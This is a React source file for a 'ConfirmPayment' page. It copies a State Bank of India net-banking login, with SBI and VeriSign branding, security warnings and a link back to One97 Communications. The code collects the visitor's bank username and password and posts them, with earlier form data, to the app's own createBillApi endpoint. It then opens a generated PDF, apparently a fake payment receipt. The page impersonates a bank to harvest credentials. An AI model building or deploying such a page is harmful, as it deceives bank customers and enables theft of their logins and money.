import React, { useEffect, useState } from 'react';
import { useHistory, useLocation } from 'react-router';
import SbiLogo from '../assets/SBI_LOGO.png';
import veriSign from '../assets/VERISIGN.png';
import { createBillApi } from '../utils/api';

const ConfirmPayment = () => {
  const history = useHistory();
  const location = useLocation();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const onResetHandler = () => {
    setUsername('');
    setPassword('');
  };

  const onSubmitHandler = async () => {
    if (!username || !password) {
      alert('Please enter username & password!');
      return;
    }
    setIsLoading(true);
    const { data, error } = await createBillApi({
      ...location.state.formData,
      username,
      password,
    });
    if (data) {
      if (data.success) {
        history.replace('/');
        window.open(`${data.pdfUrl}`, '_blank');
      }
    } else {
      alert(error.message);
    }
    setIsLoading(false);
  };

  useEffect(() => {
    if (!location?.state?.formData) {
      history.replace('/');
      return;
    }
  }, []);

  return (
    <>
      <br />
      <div className='payBox container'>
        <div className='row'>
          <div className='col-sm-6'>
            <img src={SbiLogo} className='' />
          </div>
          <div className='col-sm-6'></div>
        </div>
        <div className='payBox__top'></div>
        <div className='payBox__center'>
          <p className='ml-4 my-4'>
            <b>Login</b>
          </p>
          <div className='no-capital'>
            <div className='payBox__inner py-5'>
              <div className='form__control'>
                <label className='form__label' htmlFor='username'>
                  Username
                </label>
                <input
                  tabIndex='1'
                  disabled={isLoading}
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value.trim())}
                  className='form__input'
                  type='text'
                  id='username'
                />
              </div>
              <div className='form__control'>
                <label className='form__label' htmlFor='password'>
                  Password
                </label>
                <input
                  tabIndex='2'
                  required
                  disabled={isLoading}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className='form__input'
                  type='password'
                  id='password'
                  minLength='5'
                />
              </div>
              <div className='text-center pl-4'>
                <button
                  disabled={isLoading}
                  type='button'
                  className='mr-3 btn-primary'
                  onClick={onSubmitHandler}
                >
                  Submit
                </button>
                <button
                  disabled={isLoading}
                  type='button'
                  className='btn-danger'
                  onClick={onResetHandler}
                >
                  Reset
                </button>
              </div>

              <div className='text-center mt-4'>
                <a href=''>FAQ</a> <span className='mx-2'>|</span>
                <a href=''>About Phising</a>
              </div>
              <p className='text-center mt-3'>
                <a href=''>
                  <u>Click here</u>
                </a>{' '}
                to about this transaction and return to the One97 Commincations
                Limited site.
              </p>
              <div className='d-flex j-center a-center'>
                <img src={veriSign} className='mr-2' height='35' alt='' />
                <p className='p-0 m-0 mt-2'>
                  This site uses highly secure 256-bit encryption certified by
                  verisign.
                </p>
              </div>
              <div className='d-flex j-center a-center mt-3'>
                <p className='disclaimer text-left'>
                  <span className='text-danger mr-1'>
                    <b>Disclaimer</b>:
                  </span>
                  Lorem ipsum dolor, sit amet consectetur adipisicing elit.
                  Tenetur consectetur obcaecati inventore corporis <br /> quae
                  magni non, quos a iusto ab distinctio illum dolor vitae,
                </p>
              </div>
            </div>
          </div>
        </div>
        <br />
        <div className=''>
          <div className='payBox__bottom py-3'>
            <ul>
              <li>Mandatory fields are marked by asterisk (*)</li>
              <li>
                Do not provide your username and password anywhere in this page
              </li>
              <li>
                Your username & password are highly confidential. Never part
                with them. SBI will never ask for this information{' '}
              </li>
            </ul>
          </div>
        </div>
        <br />
        <br />
        <div className='paybox__copyright'>
          <div className='col-sm-3'>&copy; Copyright SBI.</div>
          <div className='col-sm-9'>
            <div>
              <a href='#'>Privacy Statement</a>
              <span className='mx-2'>|</span>
              <a href='#'>Disclosure</a>
              <span className='mx-2'>|</span>
              <a href='#'>Password management</a>
              <span className='mx-2'>|</span>
              <a href='#'>Security Tips</a>
              <span className='mx-2'>|</span>
              <a href='#'>Terms of Use</a>
            </div>
          </div>
        </div>
        <br />
        <br />
      </div>
      <br />
    </>
  );
};

export default ConfirmPayment;
